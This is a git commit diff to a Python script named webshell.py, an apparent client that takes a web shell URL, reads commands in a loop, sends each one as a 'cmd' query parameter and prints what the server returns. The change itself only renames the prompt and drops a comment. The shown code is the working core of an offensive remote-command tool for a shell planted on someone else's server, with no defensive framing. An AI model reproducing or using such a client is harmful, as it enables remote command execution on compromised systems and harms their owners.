18ad7c33172a3a2fb1760f25ec6c0208ddcab3a2
Zack007-as <84616617+Zack007-as@users.noreply.github.com>
2021-05-29 21:29:01 +0300

    Update webshell.py

--- webshell.py
+++ webshell.py
@@ -3,7 +3,7 @@ import requests
 shell = sys.argv[1]
 host = shell.split("/")[2]
 while True:
-    command = raw_input("sh33l@{0}~#".format(host))
+    command = raw_input("cmd@{0}~#".format(host))
     req1 = str("{0}?cmd={1}".format(shell,command)).replace(" ","20%")
     request = urllib.urlopen(req1)
-    print request.read() #server response
+    print request.read() 
